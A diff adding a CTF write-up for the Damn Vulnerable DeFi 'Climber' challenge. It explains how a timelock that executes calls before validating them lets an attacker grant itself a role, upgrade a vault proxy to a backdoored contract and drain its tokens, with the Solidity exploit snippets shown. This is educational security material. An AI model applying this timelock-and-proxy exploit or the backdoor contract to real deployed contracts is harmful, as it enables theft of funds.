@@ -439,7 +439,83 @@ https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/10
 In Progress
 
 ## Challenge 12: Climber ##
-In Progress
+### Vulnerability ###
+Execute function in ClimberTimeLock contract can execute functions in the ClimberTimeLock context, so as this contract is Admin can set role to Proposer and schedule operations over climberVaultProxy. 
+```
+        _setupRole(ADMIN_ROLE, address(this));
+```
+In addition, execute function don't validate a valid scheduled preious to execution operations:
+```
+        for (uint8 i = 0; i < targets.length; i++) {
+            targets[i].functionCallWithValue(dataElements[i], values[i]);
+        }
+        
+        require(getOperationState(id) == OperationState.ReadyForExecution);
+```
+Thus, you can change (upgrade) the underliying contract for a malicious one with (for example) a public withdraw function (backdoor).
+
+### Exploit ###
+As you can execute functions as ClimberTimeLock, first you set a Proposer role:
+```
+        addr.push(address(climberTimelock));
+        val.push(0);
+        sign.push(abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"),address(this)));
+```
+You must include schedule definition to set a valid operationId.
+```
+        addr.push(address(this));
+        val.push(0);
+        sign.push(abi.encodeWithSelector(this.schedule.selector));
+```
+And execute Proposer role grant:
+```
+        climberTimelock.execute(addr, val, sign, 0);
+```
+You don't have to worry for delay time because this wrong condition in getOperationState always set ReadyForExecution (must be <=):
+```
+(op.readyAtTimestamp >= block.timestamp)
+```
+Now, we deploy our evilClimberVault contract with a backdoor to withdraw:
+```
+    EvilClimberVault evilClimberContract = new EvilClimberVault();
+
+        function backdoor(address attacker, address tokenAddress) external {
+                IERC20 token = IERC20(tokenAddress);
+                require(token.transfer(attacker, 10_000_000e18), "Transfer failed");
+        }
+```
+Again, we define upgrade to a evil contract:
+```
+        addr.push(address(climberVaultProxy));
+        val.push(0);
+        sign.push(
+            abi.encodeWithSignature(
+                "upgradeTo(address)",
+                address(evilClimberContract)
+            )
+        );
+```
+You must include schedule definition to set a valid operationId.
+```
+        addr.push(address(this));
+        val.push(0);
+        sign.push(abi.encodeWithSelector(this.schedule.selector));
+```
+And execute upgrade:
+```
+        climberTimelock.execute(addr, val, sign, 0);
+```
+Finally, we execute a withdraw (remember climberVaultProxy address is the token owner and evilClimberContract only owns the logic executed in climberVaultProxy )
+``` 
+        bytes memory attack_func_sign = abi.encodeWithSignature(
+            "backdoor(address,address)",
+            attacker,
+            address(dvt)
+        );
+        address(climberVaultProxy).call(attack_func_sign);
+```
+Source Code:
+https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/12_Climber
 
 ## Challenge 13: Safe Miners ##
 In Progress
